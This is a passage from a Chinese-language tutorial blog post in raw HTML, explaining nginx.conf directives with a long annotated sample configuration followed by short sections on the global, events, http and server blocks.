class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">######Nginx配置文件nginx.conf中文详解#####</span><br><span class=\"line\"></span><br><span class=\"line\">#定义Nginx运行的用户和用户组</span><br><span class=\"line\">user www www;</span><br><span class=\"line\"></span><br><span class=\"line\">#nginx进程数，建议设置为等于CPU总核心数。</span><br><span class=\"line\">worker_processes 8;</span><br><span class=\"line\"></span><br><span class=\"line\">#全局错误日志定义路径与类型，[ debug | info | notice | warn | error | crit ]</span><br><span class=\"line\">error_log /usr/local/nginx/logs/error.log info;</span><br><span class=\"line\"></span><br><span class=\"line\">#进程pid文件</span><br><span class=\"line\">pid /usr/local/nginx/logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">#指定进程可以打开的最大描述符：数目</span><br><span class=\"line\">#工作模式与连接数上限</span><br><span class=\"line\">#这个指令是指当一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（ulimit -n）与nginx进程数相除，但是nginx分配请求并不是那么均匀，所以最好与ulimit -n 的值保持一致。</span><br><span class=\"line\">#现在在linux 2.6内核下开启文件打开数为65535，worker_rlimit_nofile就相应应该填写65535。</span><br><span class=\"line\">#这是因为nginx调度时分配请求到进程并不是那么的均衡，所以假如填写10240，总并发量达到3-4万时就有进程可能超过10240了，这时会返回502错误。</span><br><span class=\"line\">worker_rlimit_nofile 65535;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">events</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    #参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型</span><br><span class=\"line\">    #是Linux 2.6以上版本内核中的高性能网络I/O模型，linux建议epoll，如果跑在FreeBSD上面，就用kqueue模型。</span><br><span class=\"line\">    #补充说明：</span><br><span class=\"line\">    #与apache相类，nginx针对不同的操作系统，有不同的事件模型</span><br><span class=\"line\">    #A）标准事件模型</span><br><span class=\"line\">    #Select、poll属于标准事件模型，如果当前系统不存在更有效的方法，nginx会选择select或poll</span><br><span class=\"line\">    #B）高效事件模型</span><br><span class=\"line\">    #Kqueue：使用于FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0 和 MacOS X.使用双处理器的MacOS X系统使用kqueue可能会造成内核崩溃。</span><br><span class=\"line\">    #Epoll：使用于Linux内核2.6版本及以后的系统。</span><br><span class=\"line\">    #/dev/poll：使用于Solaris 7 11/99+，HP/UX 11.22+ (eventport)，IRIX 6.5.15+ 和 Tru64 UNIX 5.1A+。</span><br><span class=\"line\">    #Eventport：使用于Solaris 10。 为了防止出现内核崩溃的问题， 有必要安装安全补丁。</span><br><span class=\"line\">    use epoll;</span><br><span class=\"line\"></span><br><span class=\"line\">    #单个进程最大连接数（最大连接数=连接数*进程数）</span><br><span class=\"line\">    #根据硬件调整，和前面工作进程配合起来用，尽量大，但是别把cpu跑到100%就行。每个进程允许的最多连接数，理论上每台nginx服务器的最大连接数为。</span><br><span class=\"line\">    worker_connections 65535;</span><br><span class=\"line\"></span><br><span class=\"line\">    #keepalive超时时间。</span><br><span class=\"line\">    keepalive_timeout 60;</span><br><span class=\"line\"></span><br><span class=\"line\">    #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求头的大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。</span><br><span class=\"line\">    #分页大小可以用命令getconf PAGESIZE 取得。</span><br><span class=\"line\">    #[root@web001 ~]# getconf PAGESIZE</span><br><span class=\"line\">    #4096</span><br><span class=\"line\">    #但也有client_header_buffer_size超过4k的情况，但是client_header_buffer_size该值必须设置为“系统分页大小”的整倍数。</span><br><span class=\"line\">    client_header_buffer_size 4k;</span><br><span class=\"line\"></span><br><span class=\"line\">    #这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。</span><br><span class=\"line\">    open_file_cache max=65535 inactive=60s;</span><br><span class=\"line\"></span><br><span class=\"line\">    #这个是指多长时间检查一次缓存的有效信息。</span><br><span class=\"line\">    #语法:open_file_cache_valid time 默认值:open_file_cache_valid 60 使用字段:http, server, location 这个指令指定了何时需要检查open_file_cache中缓存项目的有效信息.</span><br><span class=\"line\">    open_file_cache_valid 80s;</span><br><span class=\"line\"></span><br><span class=\"line\">    #open_file_cache指令中的inactive参数时间内文件的最少使用次数，如果超过这个数字，文件描述符一直是在缓存中打开的，如上例，如果有一个文件在inactive时间内一次没被使用，它将被移除。</span><br><span class=\"line\">    #语法:open_file_cache_min_uses number 默认值:open_file_cache_min_uses 1 使用字段:http, server, location  这个指令指定了在open_file_cache指令无效的参数中一定的时间范围内可以使用的最小文件数,如果使用更大的值,文件描述符在cache中总是打开状态.</span><br><span class=\"line\">    open_file_cache_min_uses 1;</span><br><span class=\"line\"></span><br><span class=\"line\">    #语法:open_file_cache_errors on | off 默认值:open_file_cache_errors off 使用字段:http, server, location 这个指令指定是否在搜索一个文件是记录cache错误.</span><br><span class=\"line\">    open_file_cache_errors on;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#设定http服务器，利用它的反向代理功能提供负载均衡支持</span><br><span class=\"line\">http</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    #文件扩展名与文件类型映射表</span><br><span class=\"line\">    include mime.types;</span><br><span class=\"line\"></span><br><span class=\"line\">    #默认文件类型</span><br><span class=\"line\">    default_type application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #默认编码</span><br><span class=\"line\">    #charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">    #服务器名字的hash表大小</span><br><span class=\"line\">    #保存服务器名字的hash表是由指令server_names_hash_max_size 和server_names_hash_bucket_size所控制的。参数hash bucket size总是等于hash表的大小，并且是一路处理器缓存大小的倍数。在减少了在内存中的存取次数后，使在处理器中加速查找hash表键值成为可能。如果hash bucket size等于一路处理器缓存的大小，那么在查找键的时候，最坏的情况下在内存中查找的次数为2。第一次是确定存储单元的地址，第二次是在存储单元中查找键 值。因此，如果Nginx给出需要增大hash max size 或 hash bucket size的提示，那么首要的是增大前一个参数的大小.</span><br><span class=\"line\">    server_names_hash_bucket_size 128;</span><br><span class=\"line\"></span><br><span class=\"line\">    #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求的头部大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。分页大小可以用命令getconf PAGESIZE取得。</span><br><span class=\"line\">    client_header_buffer_size 32k;</span><br><span class=\"line\"></span><br><span class=\"line\">    #客户请求头缓冲大小。nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取。</span><br><span class=\"line\">    large_client_header_buffers 4 64k;</span><br><span class=\"line\"></span><br><span class=\"line\">    #设定通过nginx上传文件的大小</span><br><span class=\"line\">    client_max_body_size 8m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。</span><br><span class=\"line\">    #sendfile指令指定 nginx 是否调用sendfile 函数（zero copy 方式）来输出文件，对于普通应用，必须设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime。</span><br><span class=\"line\">    sendfile on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启目录列表访问，合适下载服务器，默认关闭。</span><br><span class=\"line\">    autoindex on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用</span><br><span class=\"line\">    tcp_nopush on;</span><br><span class=\"line\"></span><br><span class=\"line\">    tcp_nodelay on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #长连接超时时间，单位是秒</span><br><span class=\"line\">    keepalive_timeout 120;</span><br><span class=\"line\"></span><br><span class=\"line\">    #FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。</span><br><span class=\"line\">    fastcgi_connect_timeout 300;</span><br><span class=\"line\">    fastcgi_send_timeout 300;</span><br><span class=\"line\">    fastcgi_read_timeout 300;</span><br><span class=\"line\">    fastcgi_buffer_size 64k;</span><br><span class=\"line\">    fastcgi_buffers 4 64k;</span><br><span class=\"line\">    fastcgi_busy_buffers_size 128k;</span><br><span class=\"line\">    fastcgi_temp_file_write_size 128k;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip模块设置</span><br><span class=\"line\">    gzip on; #开启gzip压缩输出</span><br><span class=\"line\">    gzip_min_length 1k;    #最小压缩文件大小</span><br><span class=\"line\">    gzip_buffers 4 16k;    #压缩缓冲区</span><br><span class=\"line\">    gzip_http_version 1.0;    #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）</span><br><span class=\"line\">    gzip_comp_level 2;    #压缩等级</span><br><span class=\"line\">    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型，默认就已经包含textml，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。</span><br><span class=\"line\">    gzip_vary on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启限制IP连接数的时候需要使用</span><br><span class=\"line\">    #limit_zone crawler $binary_remote_addr 10m;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    #负载均衡配置</span><br><span class=\"line\">    upstream piao.jd.com &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        #upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。</span><br><span class=\"line\">        server 192.168.80.121:80 weight=3;</span><br><span class=\"line\">        server 192.168.80.122:80 weight=2;</span><br><span class=\"line\">        server 192.168.80.123:80 weight=3;</span><br><span class=\"line\"></span><br><span class=\"line\">        #nginx的upstream目前支持4种方式的分配</span><br><span class=\"line\">        #1、轮询（默认）</span><br><span class=\"line\">        #每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。</span><br><span class=\"line\">        #2、weight</span><br><span class=\"line\">        #指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。</span><br><span class=\"line\">        #例如：</span><br><span class=\"line\">        #upstream bakend &#123;</span><br><span class=\"line\">        #    server 192.168.0.14 weight=10;</span><br><span class=\"line\">        #    server 192.168.0.15 weight=10;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">        #2、ip_hash</span><br><span class=\"line\">        #每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。</span><br><span class=\"line\">        #例如：</span><br><span class=\"line\">        #upstream bakend &#123;</span><br><span class=\"line\">        #    ip_hash;</span><br><span class=\"line\">        #    server 192.168.0.14:88;</span><br><span class=\"line\">        #    server 192.168.0.15:80;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">        #3、fair（第三方）</span><br><span class=\"line\">        #按后端服务器的响应时间来分配请求，响应时间短的优先分配。</span><br><span class=\"line\">        #upstream backend &#123;</span><br><span class=\"line\">        #    server server1;</span><br><span class=\"line\">        #    server server2;</span><br><span class=\"line\">        #    fair;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">        #4、url_hash（第三方）</span><br><span class=\"line\">        #按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。</span><br><span class=\"line\">        #例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法</span><br><span class=\"line\">        #upstream backend &#123;</span><br><span class=\"line\">        #    server squid1:3128;</span><br><span class=\"line\">        #    server squid2:3128;</span><br><span class=\"line\">        #    hash $request_uri;</span><br><span class=\"line\">        #    hash_method crc32;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #tips:</span><br><span class=\"line\">        #upstream bakend&#123;#定义负载均衡设备的Ip及设备状态&#125;&#123;</span><br><span class=\"line\">        #    ip_hash;</span><br><span class=\"line\">        #    server 127.0.0.1:9090 down;</span><br><span class=\"line\">        #    server 127.0.0.1:8080 weight=2;</span><br><span class=\"line\">        #    server 127.0.0.1:6060;</span><br><span class=\"line\">        #    server 127.0.0.1:7070 backup;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">        #在需要使用负载均衡的server中增加 proxy_pass http://bakend/;</span><br><span class=\"line\"></span><br><span class=\"line\">        #每个设备的状态设置为:</span><br><span class=\"line\">        #1.down表示单前的server暂时不参与负载</span><br><span class=\"line\">        #2.weight为weight越大，负载的权重就越大。</span><br><span class=\"line\">        #3.max_fails：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream模块定义的错误</span><br><span class=\"line\">        #4.fail_timeout:max_fails次失败后，暂停的时间。</span><br><span class=\"line\">        #5.backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。</span><br><span class=\"line\"></span><br><span class=\"line\">        #nginx支持同时设置多组的负载均衡，用来给不用的server来使用。</span><br><span class=\"line\">        #client_body_in_file_only设置为On 可以讲client post过来的数据记录到文件中用来做debug</span><br><span class=\"line\">        #client_body_temp_path设置记录文件的目录 可以设置最多3层目录</span><br><span class=\"line\">        #location对URL进行匹配.可以进行重定向或者进行新的代理 负载均衡</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    #虚拟主机的配置</span><br><span class=\"line\">    server</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        #监听端口</span><br><span class=\"line\">        listen 80;</span><br><span class=\"line\"></span><br><span class=\"line\">        #域名可以有多个，用空格隔开</span><br><span class=\"line\">        server_name www.jd.com jd.com;</span><br><span class=\"line\">        index index.html index.htm index.php;</span><br><span class=\"line\">        root /data/www/jd;</span><br><span class=\"line\"></span><br><span class=\"line\">        #对******进行负载均衡</span><br><span class=\"line\">        location ~ .*.(php|php5)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            fastcgi_pass 127.0.0.1:9000;</span><br><span class=\"line\">            fastcgi_index index.php;</span><br><span class=\"line\">            include fastcgi.conf;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #图片缓存时间设置</span><br><span class=\"line\">        location ~ .*.(gif|jpg|jpeg|png|bmp|swf)$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            expires 10d;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #JS和CSS缓存时间设置</span><br><span class=\"line\">        location ~ .*.(js|css)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            expires 1h;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #日志格式设定</span><br><span class=\"line\">        #$remote_addr与$http_x_forwarded_for用以记录客户端的ip地址；</span><br><span class=\"line\">        #$remote_user：用来记录客户端用户名称；</span><br><span class=\"line\">        #$time_local： 用来记录访问时间与时区；</span><br><span class=\"line\">        #$request： 用来记录请求的url与http协议；</span><br><span class=\"line\">        #$status： 用来记录请求状态；成功是200，</span><br><span class=\"line\">        #$body_bytes_sent ：记录发送给客户端文件主体内容大小；</span><br><span class=\"line\">        #$http_referer：用来记录从那个页面链接访问过来的；</span><br><span class=\"line\">        #$http_user_agent：记录客户浏览器的相关信息；</span><br><span class=\"line\">        #通常web服务器放在反向代理的后面，这样就不能获取到客户的IP地址了，通过$remote_add拿到的IP地址是反向代理服务器的iP地址。反向代理服务器在转发请求的http头信息中，可以增加x_forwarded_for信息，用以记录原有客户端的IP地址和原来客户端的请求的服务器地址。</span><br><span class=\"line\">        log_format access &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">        &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">        &apos;&quot;$http_user_agent&quot; $http_x_forwarded_for&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">        #定义本虚拟主机的访问日志</span><br><span class=\"line\">        access_log  /usr/local/nginx/logs/host.access.log  main;</span><br><span class=\"line\">        access_log  /usr/local/nginx/logs/host.access.404.log  log404;</span><br><span class=\"line\"></span><br><span class=\"line\">        #对 &quot;/&quot; 启用反向代理</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            proxy_pass http://127.0.0.1:88;</span><br><span class=\"line\">            proxy_redirect off;</span><br><span class=\"line\">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\"></span><br><span class=\"line\">            #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span><br><span class=\"line\">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\"></span><br><span class=\"line\">            #以下是一些反向代理的配置，可选。</span><br><span class=\"line\">            proxy_set_header Host $host;</span><br><span class=\"line\"></span><br><span class=\"line\">            #允许客户端请求的最大单文件字节数</span><br><span class=\"line\">            client_max_body_size 10m;</span><br><span class=\"line\"></span><br><span class=\"line\">            #缓冲区代理缓冲用户端请求的最大字节数，</span><br><span class=\"line\">            #如果把它设置为比较大的数值，例如256k，那么，无论使用firefox还是IE浏览器，来提交任意小于256k的图片，都很正常。如果注释该指令，使用默认的client_body_buffer_size设置，也就是操作系统页面大小的两倍，8k或者16k，问题就出现了。</span><br><span class=\"line\">            #无论使用firefox4.0还是IE8.0，提交一个比较大，200k左右的图片，都返回500 Internal Server Error错误</span><br><span class=\"line\">            client_body_buffer_size 128k;</span><br><span class=\"line\"></span><br><span class=\"line\">            #表示使nginx阻止HTTP应答代码为400或者更高的应答。</span><br><span class=\"line\">            proxy_intercept_errors on;</span><br><span class=\"line\"></span><br><span class=\"line\">            #后端服务器连接的超时时间_发起握手等候响应超时时间</span><br><span class=\"line\">            #nginx跟后端服务器连接超时时间(代理连接超时)</span><br><span class=\"line\">            proxy_connect_timeout 90;</span><br><span class=\"line\"></span><br><span class=\"line\">            #后端服务器数据回传时间(代理发送超时)</span><br><span class=\"line\">            #后端服务器数据回传时间_就是在规定时间之内后端服务器必须传完所有的数据</span><br><span class=\"line\">            proxy_send_timeout 90;</span><br><span class=\"line\"></span><br><span class=\"line\">            #连接成功后，后端服务器响应时间(代理接收超时)</span><br><span class=\"line\">            #连接成功后_等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间）</span><br><span class=\"line\">            proxy_read_timeout 90;</span><br><span class=\"line\"></span><br><span class=\"line\">            #设置代理服务器（nginx）保存用户头信息的缓冲区大小</span><br><span class=\"line\">            #设置从被代理服务器读取的第一部分应答的缓冲区大小，通常情况下这部分应答中包含一个小的应答头，默认情况下这个值的大小为指令proxy_buffers中指定的一个缓冲区的大小，不过可以将其设置为更小</span><br><span class=\"line\">            proxy_buffer_size 4k;</span><br><span class=\"line\"></span><br><span class=\"line\">            #proxy_buffers缓冲区，网页平均在32k以下的设置</span><br><span class=\"line\">            #设置用于读取应答（来自被代理服务器）的缓冲区数目和大小，默认情况也为分页大小，根据操作系统的不同可能是4k或者8k</span><br><span class=\"line\">            proxy_buffers 4 32k;</span><br><span class=\"line\"></span><br><span class=\"line\">            #高负荷下缓冲大小（proxy_buffers*2）</span><br><span class=\"line\">            proxy_busy_buffers_size 64k;</span><br><span class=\"line\"></span><br><span class=\"line\">            #设置在写入proxy_temp_path时数据的大小，预防一个工作进程在传递文件时阻塞太长</span><br><span class=\"line\">            #设定缓存文件夹大小，大于这个值，将从upstream服务器传</span><br><span class=\"line\">            proxy_temp_file_write_size 64k;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        #设定查看Nginx状态的地址</span><br><span class=\"line\">        location /NginxStatus &#123;</span><br><span class=\"line\">            stub_status on;</span><br><span class=\"line\">            access_log on;</span><br><span class=\"line\">            auth_basic &quot;NginxStatus&quot;;</span><br><span class=\"line\">            auth_basic_user_file confpasswd;</span><br><span class=\"line\">            #htpasswd文件的内容可以用apache提供的htpasswd工具来产生。</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #本地动静分离反向代理配置</span><br><span class=\"line\">        #所有jsp的页面均交由tomcat或resin处理</span><br><span class=\"line\">        location ~ .(jsp|jspx|do)?$ &#123;</span><br><span class=\"line\">            proxy_set_header Host $host;</span><br><span class=\"line\">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">            proxy_pass http://127.0.0.1:8080;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #所有静态文件由nginx直接读取不经过tomcat或resin</span><br><span class=\"line\">        location ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|</span><br><span class=\"line\">        pdf|xls|mp3|wma)$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            expires 15d;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        location ~ .*.(js|css)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            expires 1h;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">######Nginx配置文件nginx.conf中文详解#####</span><br></pre></td></tr></table></figure><br><br></details>\n\n<h2 id=\"1-全局块\"><a href=\"#1-全局块\" class=\"headerlink\" title=\"1.全局块\"></a>1.全局块</h2><p>全局块是默认配置文件从开始到events块之间的一部分内容，主要设置一些影响Nginx服务器整体运行的配置指令，作用域是Nginx服务器全局。<br><br>通常包含配置运行Nginx服务器的用户（组）、允许生成的worker process数，Nginx进程PID存放路径、日志的存放路径和类型以及配置文件引入等。<br></p>\n<h2 id=\"2-events块\"><a href=\"#2-events块\" class=\"headerlink\" title=\"2.events块\"></a>2.events块</h2><p>events块设计的指令主要影响Nginx服务器与用户的网络连接。常用到的设置包括是选取哪种事件驱动模型处理连接请求，每个worker process可以同时支持的最大连接数等。<br><br>这一部分的指令对Nginx服务器的性能影响较大，在实际配置中应该根据实际情况灵活调整。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">events &#123;</span><br><span class=\"line\">    # epoll linux下的高效工作模型首选</span><br><span class=\"line\">    use epoll;</span><br><span class=\"line\"></span><br><span class=\"line\">    #worker_connections用于定义Nginx每个进程的最大连接数</span><br><span class=\"line\">    # 即接收前端的最大请求数</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-http块\"><a href=\"#3-http块\" class=\"headerlink\" title=\"3.http块\"></a>3.http块</h2><p>http块是Nginx服务器配置中的重要部分，代理、缓存和日志定义等绝大多数的功能和第三方模块的配置都可以放在这个模块中。<br><br>http块中可以包含自己的全局块，也可以包含server块，server块中又进一步包含location块。<br><br>可以在http全局块中配置的指令包括文件引入、MIME-Type定义、日志自定义、是否使用sendfile传输文件、连接超时时间、单请求数上线等。</p>\n<h3 id=\"3-1-http全局\"><a href=\"#3-1-http全局\" class=\"headerlink\" title=\"3.1 http全局\"></a>3.1 http全局</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    #文件扩展名与文件类型映射表 mime(多用途因特网邮件扩展)</span><br><span class=\"line\">    include mime.types;</span><br><span class=\"line\"></span><br><span class=\"line\">    #默认文件类型</span><br><span class=\"line\">    default_type application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #默认编码</span><br><span class=\"line\">    charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">    #设定通过nginx上传文件的大小</span><br><span class=\"line\">    client_max_body_size 8m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启高效文件传输模式</span><br><span class=\"line\">    sendfile on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启目录列表访问，合适下载服务器，默认关闭。</span><br><span class=\"line\">    autoindex on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用</span><br><span class=\"line\">    tcp_nopush on;</span><br><span class=\"line\">    tcp_nodelay on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #长连接超时时间，单位是秒</span><br><span class=\"line\">    keepalive_timeout 120;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip模块设置</span><br><span class=\"line\">    gzip on; #开启gzip压缩输出</span><br><span class=\"line\">    gzip_min_length 1k;    #最小压缩文件大小</span><br><span class=\"line\">    gzip_buffers 4 16k;    #压缩缓冲区</span><br><span class=\"line\">    gzip_http_version 1.0;    #压缩版本</span><br><span class=\"line\">    gzip_comp_level 2;    #压缩等级</span><br><span class=\"line\">    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型，默认就已经包含textml</span><br><span class=\"line\">    gzip_vary on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启限制IP连接数的时候需要使用</span><br><span class=\"line\">    #limit_zone crawler $binary_remote_addr 10m;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-2-server\"><a href=\"#3-2-server\" class=\"headerlink\" title=\"3.2 server\"></a>3.2 server</h3><p>每个server块就相当于一台虚拟主机，它内部可有多台主机联合提供服务，一起对外提供一组服务<br></p>\n<h4 id=\"3-2-1-server全局\"><a href=\"#3-2-1-server全局\" class=\"headerlink\" title=\"3.2.1  server全局\"></a>3.2.1  server全局</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        #监听的端口</span><br><span class=\"line\">        listen       8080;</span><br><span class=\"line\"></span><br><span class=\"line\">        #用来指定IP地址或者域名，多个域名之间用空格分开， 可以通配符 *.test.com</span><br><span class=\"line\">        server_name  localhost 192.168.12.10 www.yangyi.com;</span><br><span class=\"line\"></span><br><span class=\"line\">        #根目录</span><br><span class=\"line\">        #root   /Users/yangyi/www;</span><br><span class=\"line\">        #初始页面 自左向右匹配</span><br><span class=\"line\">        #index  index.php index.html index.htm;</span><br><span class=\"line\"></span><br><span class=\"line\">        charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">        #日志路径与级别</span><br><span class=\"line\">        access_log  usr/local/var/log/host.access.log  main;</span><br><span class=\"line\">        aerror_log  usr/local/var/log/host.error.log  error;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 